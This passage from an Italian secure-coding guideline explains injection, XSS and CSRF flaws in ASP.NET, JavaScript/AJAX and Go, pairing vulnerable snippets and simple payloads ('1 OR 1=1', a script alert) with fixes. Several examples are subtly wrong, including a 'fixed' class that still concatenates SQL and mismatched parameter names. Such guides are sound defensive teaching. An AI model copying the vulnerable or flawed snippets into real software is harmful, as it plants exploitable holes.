Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.10.7  SQL Injection 
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri URL, devono essere sempre 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
Esempio:  
Nella seguente query, realizzata concatenando strin ghe provenienti dall’input, la SQL injection è molt o 
semplice da realizzare:  
Query = “Insert into Utenti Values(‘” & textbox1.te xt & “‘,'” & textbox2.text & “‘)” 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 139  a 156  
 
L’uso di query parametriche protegge dalla possibil ità di subire attacchi di SQL Injection. La query d iventa la 
seguente:  
SqlCommand cmd = new SqlCommand( “Insert into Utent i Values(@username,@password)”, 
conn) 
cmd.Parameters.AddWithValue (“@username”,TextBox1.t ext) 
cmd.Parameters.AddWithValue (“@usercode”,TextBox2.t ext) 
cmd.ExecuteNonQuery(); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.10.8  XPath Injection 
Come riconoscerla  
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
Esempio: 
Un esempio di una ricerca all’interno din un docuem ento XML a partire da input esterno non verificato:  
customers.SelectNodes("//customer[@name='" + txtUse r.Text + "' and 
    @password='" + txtPassword.Text + "']") 
Il codice dovrebbe essere precompilato come il segu ente. Si tratta, come si può vedere, di una query 
parametrica, la stessa soluzione valida per mitigar e il rischio delle SQL injection: 
XPathNodeIterator custData = XPathCache.Select( 
   "//customer[@name=$name and @password=$password] ", 
    customersDocument, 
    new XPathVariable("name", txtName.Text),  
    new XPathVariable("password", txtPassword.Text) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
7.11  AJAX 
AJAX, acronimo di Asynchronous JavaScript and XML, è una tecnica di sviluppo software per la realizzaz ione 
di applicazioni web interattive (Rich Internet Appl ication). Le vulnerabilità di questo linguaggio son o molto 
simili a quelle presenti nel linguaggio JavaScript.   
Generalmente infatti si tratta di una tecnologia ch e fa uso di Javascript per veicolare dati, senza do ver 
ricaricare la pagina corrente.  
I dati vengono trasmessi nel formato XML. 
Di seguito l’elenco delle principali vulnerabilità e delle relative contromisure da adottare. 
 
 
Linee guida per lo sviluppo sicuro Pag. 140  a 156  
 
7.11.1   Client Dom Code Injection 
Come riconoscerla 
Un attaccante può eseguire codice arbitrario sulla macchina dell’application server. A seconda dei per messi 
di cui dispone l’applicazione, potrebbe: accedere a l database, leggere o modificare dati sensibili; le ggere, 
creare, modificare o cancellare file; aprire una co nnessione al server dell’attaccante; modificare il 
contenuto delle pagine; decifrare dati utilizzando le chiavi dell’applicazione; arrestare o avviare i servizi del 
sistema operativo; organizzare un reindirizzamento verso siti fake (fasulli) per operazioni di phishin g; 
prendere il completo controllo del server. 
Accade perché l'applicazione esegue alcune azioni e seguendo codice incluso nei dati in input non 
opportunamente validati e verificati. In questo cas o, il codice non attendibile viene letto dal browse r ed 
eseguito sul lato client. 
 
Come difendersi 
Come prima cosa, l'applicazione non dovrebbe esegui re alcun codice non attendibile da qualsiasi fonte 
esterna possa provenire, inclusi l’input dell'utent e, dei file caricati (upload) o un database. 
Se è necessario passare dati non attendibili all'es ecuzione dinamica, applicare una convalida dei dati  molto 
rigorosa. Come al solito, occorre convalidare tutti  gli input, indipendentemente dalla fonte. I parame tri 
devono essere limitati a un set di caratteri consen tito e l'input non convalidato deve essere eliminat o. Oltre 
ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo di validità, il fo rmato e 
l’eventuale corrispondenza all’interno dei valori p revisti (white list). Sconsigliata invece la black list, ossia un 
elenco di valori non consentiti: l’elenco sarebbe s empre troppo limitato, rispetto ai casi che potrebb ero 
verificarsi. 
Se è assolutamente necessario includere dati estern i nell'esecuzione dinamica, è consentito passare i dati 
come parametri al codice, ma bisogna evitare assolu tamente di eseguire direttamente i dati utente. 
L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
Evitare di creare codice XML o JSON in modo dinamic o.  
Proprio come la creazione di codice HTML o SQL potr ebbero causare dei bug di XML Injection, utilizzare  una 
libreria di codifica o delle librerie JSON o XML af fidabili per rendere sicuri gli attributi dei dati degli 
elementi. 
Non eseguire la crittografia nel codice lato client . Utilizzare le tecnologie TLS/SSL e crittografare le 
informazioni sul server. 
Evitare di chiamare dinamicamente una funzione senz a averne prima bonificato il codice. 
 
Esempio: 
var  input = document .getElementById( "id" ).value; 
window .setInterval( myFunc(input), 1000 ); 
 
Questo il software corretto dopo la sanitizzazione:  
var  input = document .getElementById( "id" ).value; 
var  trusted = escape (input); 
window .setInterval( myFunc(trusted), 1000 ); 
 
Esempio  
Uso corretto dell’aggiornamento dinamico dell'HTML nel DOM:  
document.write("<%=Encoder.encodeForJS(Encoder.enco deForHTML(untrustedData))%>"); 
 
Nel caso debba essere impostato del codice Javascri pt per delle chiamate dinamiche, vanno utilizzati s olo 
metodi predefiniti o codice Javascript non influenz abile da variabili dinamiche. Non si deve usare cod ice con 
routine tipo “eval()” particolarmente vulnerabili. 
 
Esempio di codice Javascript sicuro:  
window .setInterval( "timedFunction();" , 1000 ); 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 141  a 156  
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, Improper Control of 
Generation of Code ('Code Injection') CWE-94. 
 
7.11.2   Client DOM Stored Code Injection 
Come riconoscerla 
L'utente malintenzionato può attraverso questo tipo  di vulnerabilità causare la riscrittura di pagine web e 
l'inserimento di script dannosi per la sicurezza.  
Una vulnerabilità persistente (o stored) come la “C lient DOM Stored Code Injection” è una variante più  
pericolosa di cross-site scripting con manipolazion e di codice: si verifica quando i dati forniti dall 'attaccante 
vengono salvati sul server, e quindi visualizzati i n modo permanente sulle pagine normalmente fornite agli 
utenti durante la normale navigazione. 
Come difendersi 
Occorre evitare qualsiasi esecuzione dinamica del c odice. Se è proprio necessaria, anziché utilizzare i dati 
sul lato client, inclusi i dati precedentemente mem orizzati nella cache dalla stessa applicazione, uti lizzare 
solo dati attendibili provenienti dal server.    
Evitare di chiamare dinamicamente una funzione senz a averne prima bonificato l'input. 
Nel caso debba essere impostato del codice Javascri pt per delle chiamate dinamiche, vanno utilizzati s olo 
metodi predefiniti o codice Javascript non influenz abile da variabili dinamiche o non dipendente da ro utine 
tipo “eval()” non particolarmente sicure. 
 
Esempio di codice Javascript sicuro:  
window .setInterval( "timedFunction();" , 1000 ); 
 
Per ulteriori informazioni ed esempi si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
7.11.3   Client Dom Stored XSS 
 
Come riconoscerla 
Un malintenzionato può utilizzare l'accesso legitti mo all'applicazione per inviare dati ingegnerizzati  al 
database dell'applicazione. Quando un altro utente accede in seguito, le pagine Web potrebbero essere 
riscritte con i dati salvati e potrebbero essere at tivati script dannosi.       
L'applicazione crea pagine web che includono dati p rovenienti dal database, incorporati direttamente 
nell'HTML della pagina. Il browser, quindi, li visu alizza come parte della pagina.  
Il problema nasce quando questi dati salvati sono s tati immessi da un altro utente. Se i dati includon o 
frammenti HTML o Javascript malevoli, anche questi vengono visualizzati (o eseguiti), sebbene la vitti ma 
non si accorga dell’inganno sottostante. La vulnera bilità è perciò il risultato dell'incorporazione di  dati 
arbitrari provenienti dal database, senza prima cod ificarli. La codifica trasforma i caratteri malevol i in 
normale testo, e il browser non può più trattarli c ome codice valido HTML/Javascript. 
 
Come difendersi 
I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve ess ere 
eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo d i validità, il 
formato e l’eventuale corrispondenza all’interno de i valori previsti (white list). Sconsigliata invece  la black 
list, ossia una lista di valori non consentiti: l’e lenco sarebbe sempre troppo limitato, rispetto ai c asi che 
potrebbero verificarsi. 
 
 
Linee guida per lo sviluppo sicuro Pag. 142  a 156  
 
L’account con il quale l’applicazione viene avviata  deve avere molte restrizioni e non deve godere di 
privilegi non necessari. 
La convalida non sostituisce la codifica (encoding) , ossia la neutralizzazione di tutti i caratteri 
potenzialmente eseguibili. Tutti i dati dinamici, i ndipendentemente dall'origine, devono essere codifi cati 
prima di incorporarli nell'output. La codifica dovr ebbe essere sensibile al contesto, in base al tipo di dato 
che si vuole neutralizzare: se ci si aspetta che po ssa esserci codice HTML abusivo, occorre codificare  gli 
eventuali tag HTML, se ci si potrebbe trovare di fr onte a uno script, allora bisogna codificare gli el ementi 
sintattici di Javascript, ecc. 
Nell'intestazione della risposta HTTP Content-Type,  definire esplicitamente la codifica dei caratteri (set di 
caratteri) per l'intera pagina. 
Impostare il flag httpOnly sul cookie di sessione, per impedire agli exploit XSS di rubarlo. 
 
Esempio di HTML richiamato nel codice Javascript: l a stringa in uscita è codificata nella pagina Html prima 
che venga visualizzata nell’etichetta relativa: 
public class StoredXssFixed  
{ 
    public  string  foo (Label lblOutput, SqliteConnection connection, 
HttpServerUtility Server, string  id) 
    { 
        SqliteConnection connection = new  SqliteConnection(connectionString) 
        string  sql = "select email from CustomerLogin where customerNumb er = "  + 
id; 
        SqliteCommand cmd = new  SqliteCommand(sql, connection); 
        string  output = ( string )cmd.ExecuteScalar(); 
        lblOutput.Text = String.IsNullOrEmpty(outpu t) ? "Customer Number does not 
exist"  : Server.HtmlEncode(output);         
    } 
} 
 
Esempio Javascript per Client Dom Stored XSS.  
Forma non corretta (routine completa): 
<!DOCTYPE html> 
<html> 
<head> 
 <meta charset="utf-8"> 
 <title>XSS Example</title> 
 <script 
src="http://ajax.googleapis.com/ajax/libs/jquery/1. 6.4/jquery.min.js"></script> 
 <script> 
  $(function() { 
   $('#users').each(function() { 
    var select = $(this); 
    var option = select.children('option').first();  
    select.after(option.text()); 
    select.hide(); 
   }); 
  }); 
 </script> 
</head> 
<body> 
 <form method="post"> 
  <p> 
   <select id="users" name="users"> 
    <option 
value="bad">&lt;script&gt;alert(&#x27;xss&#x27;);&l t;/script&gt;</option> 
   </select> 
  </p> 
 </form> 
</body> 
</html> 
 
Forma corretta (fix relativa alle stringa modificat a): 
 
 
Linee guida per lo sviluppo sicuro Pag. 143  a 156  
 
la funzione after() accetta un elemento DOM, quindi  consente di creare un nodo di testo: 
select.after(document.createTextNode(option.text()) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/97.html,  
CWE-97: Improper Neutralization of Server-Side Incl udes (SSI) Within a Web Page. 
7.11.4  Client Dom XSS 
Come riconoscerla 
Un utente malintenzionato può utilizzare il social engineering per indurre un utente a inviare l'input  
modificato in modo malevolo verso il sito Web, ad e sempio inducendolo a cliccare su un URL con un’anco ra 
(hash) modificata, facendo sì che il browser riscri va le pagine Web. L'aggressore può quindi dirottare  la 
vittima verso un server fake (fasullo), che gli con sentirebbe di rubare la password dell'utente, farsi  inserire i 
dati della carta di credito, fornire informazioni f alse o eseguire del malware. Ovviamente la vittima rimane 
ignara di ciò che accade. 
L’attacco è possibile perché la pagina Web dell'app licazione incorpora nella pagina dati provenienti 
dall'input dell'utente (incluso l'URL della pagina) , facendo sì che il browser li visualizzi come part e della 
pagina Web. Se l'input include frammenti HTML o Jav aScript, anche questi vengono visualizzati (ed 
eseguiti). La vulnerabilità è il risultato dell'inc orporamento di input dell'utente arbitrario senza p rima 
codificarlo in un formato che impedirebbe al browse r di trattarlo come HTML anziché come testo normale . 
 
Come difendersi 
I parametri devono essere limitati a un set di cara tteri consentito e l'input non convalidato deve ess ere 
eliminato. Oltre ai caratteri, occorre controllare il tipo di dati, la loro dimensione, l’intervallo d i validità, il 
formato e l’eventuale corrispondenza all’interno de i valori previsti (white list). Sconsigliata invece  la black 
list, ossia un elenco di valori non consentiti: l’e lenco sarebbe sempre troppo limitato, rispetto ai c asi che 
potrebbero verificarsi. 
Effettuare un encoding (codifica) su tutti i dati d inamici prima di includerli nella pagina web. Consi derare 
per tale scopo la libreria ESAPI4JS di OWASP. 
 
Per creare dinamicamente URL in JavaScript, utilizz are la libreria OWASP ESAPI4JS: 
window.location = ESAPI4JS.encodeForURL(input); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/97.html ,  
CWE-97: Improper Neutralization of Server-Side Incl udes (SSI) Within a Web Page. 
7.11.5   Client Resource Injection 
Come riconoscerla 
Un malintenzionato potrebbe essere in grado di apri re una backdoor che gli consente di connettersi 
direttamente al server delle applicazioni, portando  potenzialmente al controllo del server o ad altri attacchi 
indiretti. In particolare, modificando il numero di  porta del socket, il malintenzionato può essere in  grado di 
bypassare insufficienti controlli di rete o offusca re l'attacco da parte dei dispositivi di rete. Inol tre, questa 
vulnerabilità può essere sfruttata per bypassare i firewall o altri meccanismi di controllo degli acce ssi; 
utilizzare l'applicazione come proxy per la scansio ne delle porte delle reti interne e l'accesso diret to ai 
sistemi locali; o indurre erroneamente l'utente a i nviare informazioni riservate a un server fasullo.  
Come difendersi 
Non consentire a un utente, direttamente o indirett amente, di definire i parametri dei socket o altre 
impostazioni di rete. 
Se possibile, limitare i WebSocket agli URL predefi niti. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 144  a 156  
 
Esempio: 
Qui viene aperto un socket con i dati (non validati ) dell’utente: 
 
var unsafe_socket; 
function createSocketToServer_Unsafe() {  
 var params = new URLSearchParams(document.location .search); 
 var wsurl = params.get("ws_url");  
 
  unsafe_socket = new WebSocket(wsurl); 
 unsafe_socket.onopen = function(){ 
   sendMessage(unsafe_socket); 
 } 
 unsafe_socket.onmessage = function(msg){ 
   receiveMessage(unsafe_socket); 
 } 
} 
 
Qui di seguito, invece, la versione sicura: 
var safe_socket_hc; 
function createSocketToServer_SafeHardcoded() {  
  safe_socket_hc = new WebSocket(SERVER_WS_URL); 
 safe_socket_hc.onopen = function(){ 
   sendMessage(safe_socket_hc); 
 } 
 safe_socket_hc.onmessage = function(msg){ 
   receiveMessage(safe_socket_hc); 
 } 
} 
 
Maggiori informazioni: http://cwe.mitre.org/data/de finitions/99.html 
 
7.11.6   Client Second Order Sql Injection 
Come riconoscerla 
L'applicazione comunica con il suo database inviand o una query SQL testuale. L'applicazione crea la qu ery 
semplicemente concatenando le stringhe con dati ott enuti dal database. Poiché tali dati potrebbero ess ere 
stati precedentemente ottenuti dall'input dell'uten te e non sono stati verificati né tanto meno bonifi cati, 
potrebbero contenere comandi SQL, che potrebbero es sere interpretati come tali dal database. 
In questo modo, un malintenzionato può accedere dir ettamente a tutti i dati del sistema. L'aggressore 
sarebbe in grado di rubare qualsiasi informazione s ensibile memorizzata dal sistema (come i dettagli 
personali dell'utente o le carte di credito) e poss ibilmente modificare o cancellare i dati esistenti.  
Come difendersi 
Procedere con la validazione dei dati, prima di sal varli nel database. 
Effettuare sempre la validazione dell’input, prima di utilizzarlo all’interno dell’applicazione. Occor re 
controllare il tipo del dato, la sua dimensione, l' intervallo di validità (range), il formato ed event uali valori 
attesi (white list). 
Occorre verificare sempre l’input, fissando control li rigidi che impediscano di immettere caratteri e tipi di 
dati potenzialmente dannosi. L’optimum è designare una white list di valori ammessi e scartare tutto c iò 
che non vi rientra.  
Codificare completamente tutti i dati dinamici prim a di incorporarli nella pagina web (encoding). La c odifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si as petta che 
possa esserci codice HTML abusivo, occorre codifica re gli eventuali tag HTML, se ci si potrebbe trovar e di 
fronte a uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
Invece di concatenare le stringhe:  
• Utilizzare componenti di database sicuri come le st ored procedure, query parametrizzate e le 
associazioni degli oggetti (per comandi e parametri ).  
 
 
Linee guida per lo sviluppo sicuro Pag. 145  a 156  
 
• Una buona soluzione è quella di utilizzare una libr eria ORM, come EntityFramework, Hibernate o 
iBatis. 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al principio del minimo 
privilegio. 
 
Esempio - Javascript per Client Second Order Sql In jection. 
Forma non corretta: 
var userId = 5; 
var query = connection.query('SELECT * FROM users W HERE id = ?', [userId], 
function(err, results) { 
 //query.sql returns SELECT * FROM users WHERE id =  '5' 
}); 
 
Forma corretta: 
var post = {id: 1, title: 'Hello MySQL'}; 
var query = connection.query('INSERT INTO posts SET  ?', post, function(err, 
result) { 
 //query.sql returns INSERT INTO posts SET `id` = 1 , `title` = 'Hello MySQL' 
}); 
7.11.7   Client Sql Injection 
Come riconoscerla 
Utilizzando questa vulnerabilità un attaccante potr ebbe utilizzare i canali di comunicazione tra 
l'applicazione e il suo database, ossia modificando  ad arte una query SQL testuale. Ciò è reso possibi le nei 
casi in cui l’applicazione costruisce dinamicamente  le query concatenandole con l’input dell’utente. S e non 
a questo non sono stati applicati i controlli di va lidità, l’attaccante potrebbe modificare i comandi SQL nel 
senso da lui desiderato. 
Come difendersi 
Valgono le considerazioni e le contromisure esposte  nel punto precedente. 
 
Esempio - Javascript per Client SQL Injection  
Forma non corretta: 
var info = { 
 userid: message.author.id 
} 
 
connection.query("SELECT * FROM table WHERE userid = '" + message.author.id + "'", 
info, function(error) { 
 if (error) throw error; 
}); 
 
Forma corretta: 
var sql = "SELECT * FROM table WHERE userid = ?"; 
var inserts = [message.author.id]; 
sql = mysql.format(sql, inserts); 
 
Per ulteriori informazioni vedere: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
 
7.11.8   Cross-Site Request Forgery (CSRF)  
Come riconoscerla 
Il  Cross-Site Request Forgery , abbreviato CSRF o anche XSRF, è una vulnerabilità a cui sono esposti i siti 
web dinamici quando sono progettati per ricevere ri chieste da un client senza meccanismi per controlla re 
 
 
Linee guida per lo sviluppo sicuro Pag. 146  a 156  
 
se la richiesta sia stata inviata intenzionalmente oppure no. Diversamente dal cross-site scripting (X SS), che 
sfrutta la fiducia di un utente in un particolare s ito, il CSRF sfrutta la fiducia di un sito nel brow ser di un 
utente. 
Nelle applicazioni Web 2.0 Ajax comunica con i serv izi Web di back-end tramite XML-RPC, SOAP o REST. È  
possibile invocarli tramite interrogazioni di tipo GET e POST che effettuano chiamate cross-site ai se rvizi 
web. La tecnologia di tipo Cross-Site Request Forge ry permette di manipolare queste chiamate indebolen do 
la sicurezza del sistema. 
Un attaccante induce la sua vittima a inviare incon sapevolmente una richiesta HTTP dal suo browser al 
sistema web dove è attualmente autenticato. Il sist ema, vulnerabile al CSRF, avendo la certezza che la  
richiesta provenga dall'utente già precedentemente autenticato la esegue senza sapere che in realtà di etro 
la richiesta si cela un'azione pensata dall'attacca nte come ad esempio un trasferimento di fondi, un 
acquisto di beni, una richiesta di dati o qualsiasi  altra funzione offerta dall'applicazione vulnerabi le. Ci sono 
innumerevoli modi con i quali un utente può essere ingannato nell'inviare una richiesta pensata da un 
attaccante: per esempio nascondendola in un element o HTML di un'immagine, una XMLHttpRequest o un 
URL. 
Come difendersi 
Usare framework, librerie, moduli e in generale cod ice fidato che permettano allo sviluppatore di evit are 
l'introduzione di questa vulnerabilità. L’uso di un  token antifalsificazione è di solito la scelta mig liore. 
Nei form che permettono operazioni importanti inser ire un campo hidden valorizzandolo con una stringa 
random. La stessa stringa, va impostata come variab ile di sessione, in questo modo non è rintracciabil e lato 
client ed è nota solo al server. Una volta compiuta  la submit del form, se il valore della variabile d i sessione 
corrisponde alla value del sopracitato campo hidden , la richiesta è da considerarsi valida. 
Identificare le operazioni che possano risultare pe ricolose e quando un utente genera un'operazione di  
questo tipo inviare una richiesta addizionale di co nferma all'utente, per esempio, la richiesta di una  
password, che deve essere verificata prima di esegu ire l'operazione. 
Non utilizzare il metodo GET per il passaggio di pa rametri da una pagina web all'altra soprattutto per  quelle 
richieste che comportano un cambiamento di stato co me ad esempio la modifica di dati. Controllare il 
campo di intestazione HTTP referer per vedere se la  richiesta è stata generata da una pagina valida. 
Verificare che il sistema sia esente da vulnerabili tà di tipo cross-site scripting poiché la difesa da  CSRF può 
essere rafforzata da queste contromisure.  
Dal lato utente è buona abitudine eseguire sempre i l logout da siti web sensibili prima di visitare al tre 
pagine web. 
 
Per ulteriori informazioni vedere: http://cwe.mitre.org/data/definitions/352.html ,  
CWE-352: Cross-Site Request Forgery (CSRF). 
 
Esempio: 
Viene introdotto per un campo in input un token ant ifalsificazione: 
<form action="/Home/Test" method="post"> 
  <input name="__RequestVerificationToken" type="hi dden"   
      value="6fGBtLZmVBZ59oUad1Fr33BuPxANKY9q3Srr5y [...]" />   
  <input type="submit" value="Submit" /> 
</form> 
Per evitare l’invio del token in JSON, da parte del lo script Ajax, lo si può includere in un’intestazi one http 
dettagliata: 
<script> 
  @functions{ 
    public string TokenHeaderValue() 
    { 
      string cookieToken, formToken; 
      AntiForgery.GetTokens(null, out cookieToken, out formToken); 
      return cookieToken + ":" + formToken;         
    } 
  } 
 
 
Linee guida per lo sviluppo sicuro Pag. 147  a 156  
 
 
  $.ajax("api/values", { 
    type: "post", 
    contentType: "application/json", 
    data: { }, // JSON data goes here 
    dataType: "json", 
    headers: { 
      'RequestVerificationToken': '@TokenHeaderValu e()' 
    } 
  }); 
</script> 
 
7.12  GO 
Go è un linguaggio di programmazione open source, s viluppato da Google e pubblicato per la prima volta  
nel 2009. È nato dall’esigenza di avere un linguagg io facile da imparare, specializzato nella programm azione 
concorrente e che avesse un compilatore in grado di  produrre eseguibili efficienti e veloci. La sintas si è 
molto simile al C. 
7.12.1  Client Dom Stored XSS 
Come riconoscerla 
Cross-site scripting (XSS) è una vulnerabilità che affligge siti web dinamici che impiegano un insuffi ciente 
controllo dell'input, in qualsiasi modo pervenuto. Un attacco di XSS permette a un malintenzionato di 
inserire o eseguire codice lato client al fine di a ttuare un insieme variegato di operazioni quali ad esempio: 
raccolta, manipolazione e reindirizzamento di infor mazioni riservate, visualizzazione e modifica di da ti 
presenti sui server, alterazione del comportamento dinamico delle pagine web ecc.  
GO, proprio come qualsiasi altro linguaggio di prog rammazione multiuso, è vulnerabile a XSS nonostante  la 
documentazione indirizzi chiaramente sull'utilizzo di html/template package.  
In riferimento al seguente frammento di codice: 
 
package main 
import "net/http"  
import "io" 
func handler (w http.ResponseWriter, r 
*http.Request) {  io.WriteString(w, 
r.URL.Query().Get( "param1" )) 
} 
func main () {  
http.HandleFunc( "/" , handler)  
http.ListenAndServe( ":8080" , nil )  
} 
 
Questo codice crea e avvia un server HTTP in ascolt o sulla porta 8080 (main()) gestendo le richieste s ulla 
root del server (/).  
La funzione handler(), che gestisce le richieste, p revede un parametro query stringa Param1, il cui va lore 
viene quindi scritto nel flusso di risposta (w):  
Se param1=test, il Content-Type sarà inviato come t ext/plain:  
 
 
Linee guida per lo sviluppo sicuro Pag. 148  a 156  
 
 
 
Se param1=<h1>, il Content-Type sarà inviato come t ext/html (ciò rende vulnerabile a XSS):  
 
Si potrebbe pensare che rendere param1 uguale a qua lsiasi tag HTML porti allo stesso comportamento, ma  
non è così: param1=<h2>, param1=<span>, param1=<for m> non modificano Content-Type in text/html, 
bensì in plain / text.  
Se param1=<script>alert(1)</script>, il Content-Typ e sarà inviato come text/html e il valore sarà rest ituito e 
quindi facilmente interpretato tramite l’alert (XSS  - Cross Site Scripting):  

 
 
Linee guida per lo sviluppo sicuro Pag. 149  a 156  
 
 
 
Come difendersi 
Sostituire il text/template package con html/templa te: 
package main 
import "net/http"  
import "html/template" 
func handler(w http.ResponseWriter, r *http.Request) 
{ param1 := r.URL.Query().Get( "param1" ) 
tmpl := template.New( "hello" )  
tmpl, _ = tmpl.Parse( `{{define "T"}}{{.}}{{end}}` )  
tmpl.ExecuteTemplate(w, "T" , param1)  
} 
 
func main() {  
http.HandleFunc( "/" , handler)  
http.ListenAndServe( ":8080" , nil )  
} 
 
 
Se param1= <h1>, l'intestazione di risposta HTTP Content-Type  non verrà inviata come text/plain  : 
 
 
Param1 è correttamente codificato sul browser:  

 
 
Linee guida per lo sviluppo sicuro Pag. 150  a 156  
 
 
7.12.2  SQL Injection 
Come riconoscerla 
L’SQL Injection nasce dalla mancata/non corretta co difica dei dati di input/output. Partendo dalla que ry di 
esempio riportata di seguito: 
ctx := context.Background()  
customerId := r.URL.Query().Get( "id" )  
query := "SELECT number, expireDate, cvv FROM creditcards WH ERE customerId = "  + 
customerId 
row, _ := db.QueryContext(ctx, query) 
 
Quando viene fornito un customerId valido, la query  restituisce l’elenco delle carte di credito del cl iente. 
Tuttavia, se customerId non è un valore, ma una str inga (concatenazione di diversi valori/simboli) com e 
nell’esempio che segue: 
 
SELECT number , expireDate, cvv  FROM creditcards  WHERE customerId =  1 OR 1=1 
 
La query restituirebbe (a meno di opportune verific he dei dati immessi in input) tutti i record della tabella 
relativamente a tutti i clienti censiti poiché la c ondizione 1 = 1 sarà ‘truè per qualsiasi record. 
Come difendersi 
Impostare i placeholder: 
 
ctx := context.Background()  
customerId := r.URL.Query().Get( "id" )  
query := "SELECT number, expireDate, cvv FROM creditcards WH ERE customerId = ?" 
stmt, _ := db.QueryContext(ctx, query, customerId) 
 
La sintassi è specifica: 
MySQL  PostgreSQL  Oracle  
   
WHERE col = ? WHERE col = $1 WHERE col = :col 
VALUES(?, ?, ?) VALUES($1, $2, $3) VALUES(:val1, :val2, :val3) 
   
 

 
 
Linee guida per lo sviluppo sicuro Pag. 151  a 156  
 
7.12.3  Ulteriori indicazioni per lo sviluppo sicuro 
L'input dell'utente e i relativi dati associati rap presentano un rischio se non vengono attuati opport uni 
controlli di "Input Validation" e "Input Sanitizati on". Tutte le procedure di convalida dei dati devon o essere 
eseguite su sistemi affidabili (ad esempio sul serv er) e devono essere eseguite a ogni livello 
dell'applicazione.  
7.12.3.1  Validazione dell’INPUT 
I dati dell’input devono essere considerati non sic uri per impostazione predefinita e accettati solo d opo 
aver effettuato i controlli di sicurezza appropriat i. Anche le fonti dei dati devono essere identifica te come 
attendibili o non affidabili e, in caso di fonti no n attendibili, devono essere eseguiti controlli di convalida.  
Se la convalida fallisce, l'input deve essere rifiu tato.  
Go dispone di librerie native che includono metodi a supporto del processo di validazione e sanitizzaz ione 
dei dati: 
• strconv per la conversione  di stringhe ad altre tipologie di dati: 
o Atoi 
o ParseBool 
o ParseFloat 
o ParseInt 
• strings per gestire  le stringhe e relative proprietà: 
o Trim 
o ToLower 
o ToTitle 
• regexp utilizzabile nelle espressioni regolari per gestire formati  personalizzati. 
• Altre  tecniche per garantire la validità dei dati di inp ut includono: 
o White listing – verificare l’input sulla base di una white list d i caratteri consentiti. 
o Boundary checking  – verificare la lunghezza dei numeri e dei dati. 
o Validazione numerica. 
